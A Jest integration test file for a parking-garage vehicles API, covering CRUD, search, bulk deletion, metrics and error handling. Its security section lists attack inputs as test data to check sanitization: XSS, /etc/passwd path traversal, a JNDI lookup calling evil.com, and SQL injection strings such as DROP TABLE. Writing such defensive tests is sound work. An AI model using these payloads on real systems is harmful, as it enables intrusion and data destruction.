/**
 * Vehicles API Integration Tests
 * 
 * Comprehensive tests for vehicle management endpoints including
 * CRUD operations, search functionality, bulk operations, validation,
 * and relationship testing. Tests both success and failure scenarios.
 */

const request = require('supertest');
const app = require('../../src/app');
const MemoryStore = require('../../src/storage/memoryStore');
const { TestDataBuilder, MockGarageAPI } = require('../helpers/testUtils');

describe('Vehicles API Integration Tests', () => {
  let store;
  let mockAPI;

  beforeEach(() => {
    // Reset memory store and initialize test data
    store = MemoryStore.getInstance();
    store.spots.clear();
    store.vehicles.clear();
    store.spotsByFloorBay.clear();
    store.occupiedSpots.clear();
    
    mockAPI = new MockGarageAPI();
    mockAPI.reset();
    
    // Initialize test data with various vehicles
    initializeTestVehicleData();
  });

  /**
   * Initialize test data with various vehicle types and states
   */
  function initializeTestVehicleData() {
    // Create parked vehicles
    mockAPI.state.checkInVehicle('PARKED001');
    mockAPI.state.checkInVehicle('PARKED002');
    mockAPI.state.checkInVehicle('PARKED003');

    // Create some completed sessions (vehicles that were parked and left)
    mockAPI.state.checkInVehicle('HISTORIC001');
    mockAPI.state.checkOutVehicle('HISTORIC001');

    mockAPI.state.checkInVehicle('HISTORIC002');
    mockAPI.state.checkOutVehicle('HISTORIC002');

    // Create some test vehicles for manipulation
    const testVehicles = [
      { licensePlate: 'TEST001', type: 'compact', rateType: 'hourly' },
      { licensePlate: 'TEST002', type: 'standard', rateType: 'daily' },
      { licensePlate: 'TEST003', type: 'oversized', rateType: 'monthly' },
      { licensePlate: 'SEARCH-ME-001', type: 'standard', rateType: 'hourly' },
      { licensePlate: 'SEARCH-ME-002', type: 'compact', rateType: 'daily' }
    ];

    testVehicles.forEach(vehicle => {
      // Add to mock vehicle repository for testing purposes
      if (store.vehicles) {
        store.vehicles.set(vehicle.licensePlate, {
          licensePlate: vehicle.licensePlate,
          vehicleType: vehicle.type,
          rateType: vehicle.rateType,
          createdAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
          isActive: true
        });
      }
    });
  }

  describe('GET /api/vehicles - List All Vehicles', () => {
    test('should return all vehicles with default pagination', async () => {
      const response = await request(app)
        .get('/api/vehicles')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          vehicles: expect.any(Array),
          pagination: expect.objectContaining({
            page: 1,
            limit: expect.any(Number),
            total: expect.any(Number),
            totalPages: expect.any(Number),
            hasNextPage: expect.any(Boolean),
            hasPreviousPage: false
          })
        }),
        timestamp: expect.any(String)
      });

      expect(response.body.data.vehicles.length).toBeGreaterThan(0);

      // Verify vehicle structure
      const vehicle = response.body.data.vehicles[0];
      expect(vehicle).toEqual(expect.objectContaining({
        licensePlate: expect.any(String),
        vehicleType: expect.stringMatching(/^(compact|standard|oversized)$/),
        rateType: expect.stringMatching(/^(hourly|daily|monthly)$/),
        createdAt: expect.any(String),
        isActive: expect.any(Boolean)
      }));
    });

    test('should handle pagination correctly', async () => {
      const response = await request(app)
        .get('/api/vehicles?page=1&limit=3')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.pagination).toEqual(expect.objectContaining({
        page: 1,
        limit: 3,
        total: expect.any(Number)
      }));
      expect(response.body.data.vehicles.length).toBeLessThanOrEqual(3);
    });

    test('should search vehicles by license plate', async () => {
      const response = await request(app)
        .get('/api/vehicles?search=SEARCH-ME')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.vehicles).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            licensePlate: expect.stringContaining('SEARCH-ME')
          })
        ])
      );

      // All returned vehicles should match the search term
      response.body.data.vehicles.forEach(vehicle => {
        expect(vehicle.licensePlate).toContain('SEARCH-ME');
      });
    });

    test('should validate pagination parameters', async () => {
      const response = await request(app)
        .get('/api/vehicles?page=-1&limit=0')
        .expect(200); // Should succeed with corrected parameters

      expect(response.body.data.pagination.page).toBe(1); // Corrected to minimum
      expect(response.body.data.pagination.limit).toBeGreaterThan(0); // Corrected to minimum
    });

    test('should handle empty search results', async () => {
      const response = await request(app)
        .get('/api/vehicles?search=NONEXISTENT')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.vehicles).toEqual([]);
      expect(response.body.data.pagination.total).toBe(0);
    });
  });

  describe('POST /api/vehicles - Create Vehicle', () => {
    test('should create a new vehicle successfully', async () => {
      const vehicleData = {
        licensePlate: 'CREATE001',
        vehicleType: 'standard',
        rateType: 'hourly',
        ownerInfo: {
          name: 'John Doe',
          phone: '555-1234',
          email: 'john@example.com'
        }
      };

      const response = await request(app)
        .post('/api/vehicles')
        .send(vehicleData)
        .expect(201);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          licensePlate: 'CREATE001',
          vehicleType: 'standard',
          rateType: 'hourly',
          ownerInfo: expect.objectContaining({
            name: 'John Doe',
            phone: '555-1234',
            email: 'john@example.com'
          }),
          createdAt: expect.any(String),
          updatedAt: expect.any(String),
          isActive: true
        }),
        message: 'Vehicle created successfully',
        timestamp: expect.any(String)
      });
    });

    test('should normalize license plate to uppercase', async () => {
      const vehicleData = {
        licensePlate: 'lowercase123',
        vehicleType: 'compact',
        rateType: 'daily'
      };

      const response = await request(app)
        .post('/api/vehicles')
        .send(vehicleData)
        .expect(201);

      expect(response.body.data.licensePlate).toBe('LOWERCASE123');
    });

    test('should validate required fields', async () => {
      const response = await request(app)
        .post('/api/vehicles')
        .send({})
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Validation failed',
        errors: expect.arrayContaining([
          expect.stringContaining('licensePlate is required'),
          expect.stringContaining('vehicleType is required')
        ]),
        timestamp: expect.any(String)
      });
    });

    test('should validate license plate format', async () => {
      const invalidPlates = ['A', 'TOOLONGPLATENAME123', '', '  '];

      for (const plate of invalidPlates) {
        const response = await request(app)
          .post('/api/vehicles')
          .send({
            licensePlate: plate,
            vehicleType: 'standard',
            rateType: 'hourly'
          })
          .expect(400);

        expect(response.body.success).toBe(false);
        expect(response.body.errors).toEqual(
          expect.arrayContaining([
            expect.stringContaining('License plate')
          ])
        );
      }
    });

    test('should validate vehicle type', async () => {
      const response = await request(app)
        .post('/api/vehicles')
        .send({
          licensePlate: 'INVALID001',
          vehicleType: 'invalid-type',
          rateType: 'hourly'
        })
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Validation failed',
        errors: expect.arrayContaining([
          expect.stringContaining('Invalid vehicle type')
        ]),
        timestamp: expect.any(String)
      });
    });

    test('should validate rate type', async () => {
      const response = await request(app)
        .post('/api/vehicles')
        .send({
          licensePlate: 'INVALID002',
          vehicleType: 'standard',
          rateType: 'invalid-rate'
        })
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Validation failed',
        errors: expect.arrayContaining([
          expect.stringContaining('Invalid rate type')
        ]),
        timestamp: expect.any(String)
      });
    });

    test('should prevent duplicate vehicle creation', async () => {
      const vehicleData = {
        licensePlate: 'DUPLICATE001',
        vehicleType: 'standard',
        rateType: 'hourly'
      };

      // First creation should succeed
      await request(app)
        .post('/api/vehicles')
        .send(vehicleData)
        .expect(201);

      // Second creation should fail
      const response = await request(app)
        .post('/api/vehicles')
        .send(vehicleData)
        .expect(409);

      expect(response.body).toEqual({
        success: false,
        message: 'Vehicle already exists',
        error: expect.stringContaining('DUPLICATE001'),
        errorCode: 'DUPLICATE_VEHICLE',
        timestamp: expect.any(String)
      });
    });

    test('should reject invalid additional fields', async () => {
      const response = await request(app)
        .post('/api/vehicles')
        .send({
          licensePlate: 'VALID001',
          vehicleType: 'standard',
          rateType: 'hourly',
          invalidField: 'should not be here',
          anotherInvalid: 123
        })
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Validation failed',
        errors: expect.arrayContaining([
          expect.stringContaining('Invalid fields')
        ]),
        timestamp: expect.any(String)
      });
    });
  });

  describe('GET /api/vehicles/:id - Get Vehicle by ID', () => {
    test('should return specific vehicle details', async () => {
      const response = await request(app)
        .get('/api/vehicles/TEST001')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          licensePlate: 'TEST001',
          vehicleType: expect.any(String),
          rateType: expect.any(String),
          createdAt: expect.any(String),
          isActive: expect.any(Boolean)
        }),
        timestamp: expect.any(String)
      });
    });

    test('should include parking history if vehicle was parked', async () => {
      const response = await request(app)
        .get('/api/vehicles/PARKED001')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data).toEqual(expect.objectContaining({
        licensePlate: 'PARKED001',
        parkingHistory: expect.any(Array),
        currentSession: expect.any(Object)
      }));
    });

    test('should normalize license plate in URL', async () => {
      const response = await request(app)
        .get('/api/vehicles/test001') // lowercase
        .expect(200);

      expect(response.body.data.licensePlate).toBe('TEST001');
    });

    test('should return 404 for non-existent vehicle', async () => {
      const response = await request(app)
        .get('/api/vehicles/NONEXISTENT')
        .expect(404);

      expect(response.body).toEqual({
        success: false,
        message: 'Vehicle not found',
        error: expect.stringContaining('NONEXISTENT'),
        timestamp: expect.any(String)
      });
    });

    test('should validate license plate format in URL', async () => {
      const response = await request(app)
        .get('/api/vehicles/A') // Too short
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Invalid license plate format',
        timestamp: expect.any(String)
      });
    });
  });

  describe('PUT /api/vehicles/:id - Update Vehicle', () => {
    test('should update vehicle successfully', async () => {
      const updateData = {
        vehicleType: 'oversized',
        rateType: 'daily',
        ownerInfo: {
          name: 'Updated Owner',
          phone: '555-9999'
        }
      };

      const response = await request(app)
        .put('/api/vehicles/TEST001')
        .send(updateData)
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          licensePlate: 'TEST001',
          vehicleType: 'oversized',
          rateType: 'daily',
          ownerInfo: expect.objectContaining({
            name: 'Updated Owner',
            phone: '555-9999'
          }),
          updatedAt: expect.any(String)
        }),
        message: 'Vehicle updated successfully',
        timestamp: expect.any(String)
      });
    });

    test('should allow partial updates', async () => {
      const updateData = {
        rateType: 'monthly'
      };

      const response = await request(app)
        .put('/api/vehicles/TEST002')
        .send(updateData)
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.rateType).toBe('monthly');
      // Other fields should remain unchanged
      expect(response.body.data.vehicleType).toBe('standard'); // Original value
    });

    test('should prevent license plate changes', async () => {
      const updateData = {
        licensePlate: 'NEWPLATE001',
        vehicleType: 'compact'
      };

      const response = await request(app)
        .put('/api/vehicles/TEST003')
        .send(updateData)
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'License plate cannot be changed',
        timestamp: expect.any(String)
      });
    });

    test('should validate update data', async () => {
      const updateData = {
        vehicleType: 'invalid-type',
        rateType: 'invalid-rate'
      };

      const response = await request(app)
        .put('/api/vehicles/TEST001')
        .send(updateData)
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Validation failed',
        errors: expect.arrayContaining([
          expect.stringContaining('Invalid vehicle type'),
          expect.stringContaining('Invalid rate type')
        ]),
        timestamp: expect.any(String)
      });
    });

    test('should return 404 for non-existent vehicle', async () => {
      const updateData = {
        vehicleType: 'standard'
      };

      const response = await request(app)
        .put('/api/vehicles/NONEXISTENT')
        .send(updateData)
        .expect(404);

      expect(response.body).toEqual({
        success: false,
        message: 'Vehicle not found',
        timestamp: expect.any(String)
      });
    });

    test('should reject empty update request', async () => {
      const response = await request(app)
        .put('/api/vehicles/TEST001')
        .send({})
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Update data is required',
        timestamp: expect.any(String)
      });
    });
  });

  describe('DELETE /api/vehicles/:id - Delete Vehicle', () => {
    test('should delete vehicle successfully', async () => {
      const response = await request(app)
        .delete('/api/vehicles/TEST001')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        message: 'Vehicle deleted successfully',
        data: expect.objectContaining({
          licensePlate: 'TEST001',
          deletedAt: expect.any(String)
        }),
        timestamp: expect.any(String)
      });

      // Verify vehicle is no longer accessible
      await request(app)
        .get('/api/vehicles/TEST001')
        .expect(404);
    });

    test('should prevent deletion of currently parked vehicle', async () => {
      const response = await request(app)
        .delete('/api/vehicles/PARKED001')
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Cannot delete vehicle that is currently parked',
        error: expect.stringContaining('PARKED001 is currently in spot'),
        errorCode: 'VEHICLE_CURRENTLY_PARKED',
        timestamp: expect.any(String)
      });
    });

    test('should allow soft delete with preservation option', async () => {
      const response = await request(app)
        .delete('/api/vehicles/TEST002?preserve=true')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        message: 'Vehicle marked as inactive',
        data: expect.objectContaining({
          licensePlate: 'TEST002',
          isActive: false,
          deletedAt: expect.any(String)
        }),
        timestamp: expect.any(String)
      });
    });

    test('should return 404 for non-existent vehicle', async () => {
      const response = await request(app)
        .delete('/api/vehicles/NONEXISTENT')
        .expect(404);

      expect(response.body).toEqual({
        success: false,
        message: 'Vehicle not found',
        timestamp: expect.any(String)
      });
    });
  });

  describe('POST /api/vehicles/bulk-delete - Bulk Delete Vehicles', () => {
    test('should bulk delete multiple vehicles', async () => {
      const vehicleIds = ['TEST001', 'TEST002', 'TEST003'];

      const response = await request(app)
        .post('/api/vehicles/bulk-delete')
        .send({ vehicleIds })
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          deleted: expect.any(Array),
          failed: expect.any(Array),
          deletedCount: expect.any(Number),
          failedCount: expect.any(Number)
        }),
        message: expect.stringContaining('deleted successfully'),
        timestamp: expect.any(String)
      });

      expect(response.body.data.deletedCount).toBeGreaterThan(0);
    });

    test('should handle mixed success/failure in bulk delete', async () => {
      const vehicleIds = ['TEST001', 'PARKED001', 'NONEXISTENT']; // Mix of deletable, protected, and non-existent

      const response = await request(app)
        .post('/api/vehicles/bulk-delete')
        .send({ vehicleIds })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.deleted.length).toBeGreaterThan(0);
      expect(response.body.data.failed.length).toBeGreaterThan(0);

      // Verify detailed failure reasons
      response.body.data.failed.forEach(failure => {
        expect(failure).toEqual(expect.objectContaining({
          licensePlate: expect.any(String),
          reason: expect.any(String)
        }));
      });
    });

    test('should validate bulk delete request', async () => {
      const response = await request(app)
        .post('/api/vehicles/bulk-delete')
        .send({})
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'vehicleIds array is required',
        timestamp: expect.any(String)
      });
    });

    test('should enforce bulk delete limits', async () => {
      const vehicleIds = Array.from({ length: 101 }, (_, i) => `BULK${i}`);

      const response = await request(app)
        .post('/api/vehicles/bulk-delete')
        .send({ vehicleIds })
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Cannot delete more than 100 vehicles at once',
        timestamp: expect.any(String)
      });
    });
  });

  describe('GET /api/vehicles/metrics - Vehicle Metrics', () => {
    test('should return vehicle metrics and statistics', async () => {
      const response = await request(app)
        .get('/api/vehicles/metrics')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          total: expect.any(Number),
          active: expect.any(Number),
          parked: expect.any(Number),
          byType: expect.objectContaining({
            compact: expect.any(Number),
            standard: expect.any(Number),
            oversized: expect.any(Number)
          }),
          byRateType: expect.objectContaining({
            hourly: expect.any(Number),
            daily: expect.any(Number),
            monthly: expect.any(Number)
          }),
          registrationTrends: expect.any(Object)
        }),
        timestamp: expect.any(String)
      });
    });

    test('should include time-based metrics', async () => {
      const response = await request(app)
        .get('/api/vehicles/metrics?period=month')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data).toEqual(expect.objectContaining({
        period: 'month',
        newRegistrations: expect.any(Number),
        deletedVehicles: expect.any(Number),
        activeVehicles: expect.any(Number)
      }));
    });
  });

  describe('GET /api/vehicles/search - Legacy Search', () => {
    test('should perform exact search', async () => {
      const response = await request(app)
        .get('/api/vehicles/search?search=SEARCH-ME-001&mode=exact')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          results: expect.arrayContaining([
            expect.objectContaining({
              licensePlate: 'SEARCH-ME-001'
            })
          ]),
          searchMode: 'exact',
          searchTerm: 'SEARCH-ME-001'
        }),
        timestamp: expect.any(String)
      });
    });

    test('should perform partial search', async () => {
      const response = await request(app)
        .get('/api/vehicles/search?search=SEARCH&mode=partial')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.searchMode).toBe('partial');
      expect(response.body.data.results.length).toBeGreaterThan(0);

      // All results should contain the search term
      response.body.data.results.forEach(result => {
        expect(result.licensePlate).toContain('SEARCH');
      });
    });

    test('should perform fuzzy search', async () => {
      const response = await request(app)
        .get('/api/vehicles/search?search=SARCH-ME&mode=fuzzy') // Typo intentional
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.searchMode).toBe('fuzzy');
      // Fuzzy search should still find similar matches
    });

    test('should validate search parameters', async () => {
      const response = await request(app)
        .get('/api/vehicles/search') // Missing search parameter
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Search term is required',
        timestamp: expect.any(String)
      });
    });

    test('should validate search mode', async () => {
      const response = await request(app)
        .get('/api/vehicles/search?search=TEST&mode=invalid')
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Invalid search mode. Must be one of: exact, partial, fuzzy, all',
        timestamp: expect.any(String)
      });
    });
  });

  describe('Authorization and Security', () => {
    test('should sanitize license plate inputs', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'OR 1=1--',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com}',
        '%00%2e%2e%2f'
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/vehicles')
          .send({
            licensePlate: input,
            vehicleType: 'standard',
            rateType: 'hourly'
          });

        expect(response.status).toBeLessThan(500); // Should not crash
        if (response.status === 201) {
          // If created, should be sanitized
          expect(response.body.data.licensePlate).not.toBe(input);
        } else {
          // Should be rejected with validation error
          expect(response.body.success).toBe(false);
        }
      }
    });

    test('should prevent SQL injection in search', async () => {
      const sqlInjections = [
        "'; DROP TABLE vehicles; --",
        "' OR '1'='1",
        "UNION SELECT * FROM users--",
        "'; INSERT INTO vehicles VALUES('HACKED'); --"
      ];

      for (const injection of sqlInjections) {
        const response = await request(app)
          .get(`/api/vehicles/search?search=${encodeURIComponent(injection)}`)
          .expect(200);

        // Should return normal search results, not crash
        expect(response.body.success).toBe(true);
        expect(response.body.data).toEqual(expect.objectContaining({
          results: expect.any(Array),
          searchTerm: injection
        }));
      }
    });

    test('should rate limit vehicle operations', async () => {
      // Test multiple rapid requests
      const promises = [];
      for (let i = 0; i < 20; i++) {
        promises.push(request(app).get('/api/vehicles'));
      }

      const responses = await Promise.all(promises);
      
      // All should succeed or rate limit (429), none should crash (500)
      responses.forEach(response => {
        expect([200, 429]).toContain(response.status);
      });
    });
  });

  describe('Relationship Testing', () => {
    test('should maintain referential integrity on vehicle deletion', async () => {
      // Create vehicle and park it
      await request(app)
        .post('/api/vehicles')
        .send({
          licensePlate: 'RELATION001',
          vehicleType: 'standard',
          rateType: 'hourly'
        })
        .expect(201);

      // Check vehicle in
      await request(app)
        .post('/api/checkin')
        .send({
          licensePlate: 'RELATION001',
          vehicleType: 'standard'
        })
        .expect(201);

      // Try to delete parked vehicle
      const deleteResponse = await request(app)
        .delete('/api/vehicles/RELATION001')
        .expect(400);

      expect(deleteResponse.body.errorCode).toBe('VEHICLE_CURRENTLY_PARKED');
    });

    test('should handle vehicle-session relationships correctly', async () => {
      const vehicleResponse = await request(app)
        .get('/api/vehicles/PARKED001')
        .expect(200);

      const vehicle = vehicleResponse.body.data;
      
      if (vehicle.currentSession) {
        // Verify session exists and references this vehicle
        const sessionResponse = await request(app)
          .get(`/api/sessions/${vehicle.currentSession.id}`)
          .expect(200);

        expect(sessionResponse.body.data.licensePlate).toBe('PARKED001');
      }
    });
  });

  describe('Edge Cases and Error Handling', () => {
    test('should handle concurrent vehicle operations', async () => {
      const licensePlate = 'CONCURRENT001';

      // Create vehicle first
      await request(app)
        .post('/api/vehicles')
        .send({
          licensePlate,
          vehicleType: 'standard',
          rateType: 'hourly'
        })
        .expect(201);

      // Attempt concurrent update and delete
      const updatePromise = request(app)
        .put(`/api/vehicles/${licensePlate}`)
        .send({ vehicleType: 'compact' });

      const deletePromise = request(app)
        .delete(`/api/vehicles/${licensePlate}`);

      const [updateResponse, deleteResponse] = await Promise.all([updatePromise, deletePromise]);

      // One should succeed, one should fail appropriately
      const successResponses = [updateResponse, deleteResponse].filter(r => r.status < 300);
      const errorResponses = [updateResponse, deleteResponse].filter(r => r.status >= 400);

      expect(successResponses.length).toBe(1);
      expect(errorResponses.length).toBe(1);
    });

    test('should handle database errors gracefully', async () => {
      // Simulate database error
      const originalVehicles = store.vehicles;
      store.vehicles = null;

      const response = await request(app)
        .get('/api/vehicles')
        .expect(500);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Internal server error'),
        timestamp: expect.any(String)
      });

      // Restore for cleanup
      store.vehicles = originalVehicles;
    });

    test('should handle malformed JSON payloads', async () => {
      const response = await request(app)
        .post('/api/vehicles')
        .set('Content-Type', 'application/json')
        .send('{"licensePlate": "MALFORMED", invalid json}')
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('Invalid JSON');
    });

    test('should handle extremely long request payloads', async () => {
      const longString = 'A'.repeat(10000);
      
      const response = await request(app)
        .post('/api/vehicles')
        .send({
          licensePlate: longString,
          vehicleType: 'standard',
          rateType: 'hourly'
        })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.errors).toEqual(
        expect.arrayContaining([
          expect.stringContaining('License plate')
        ])
      );
    });

    test('should handle Unicode and special characters in license plates', async () => {
      const unicodePlates = [
        'TEST-ÄÖÜ',
        'PLATE-中文',
        'EMOJI-🚗',
        'SYMBOLS-©®™'
      ];

      for (const plate of unicodePlates) {
        const response = await request(app)
          .post('/api/vehicles')
          .send({
            licensePlate: plate,
            vehicleType: 'standard',
            rateType: 'hourly'
          });

        // Should either succeed with normalized plate or fail with validation error
        expect([201, 400]).toContain(response.status);
        if (response.status === 201) {
          expect(response.body.data.licensePlate).toBeTruthy();
        }
      }
    });
  });
});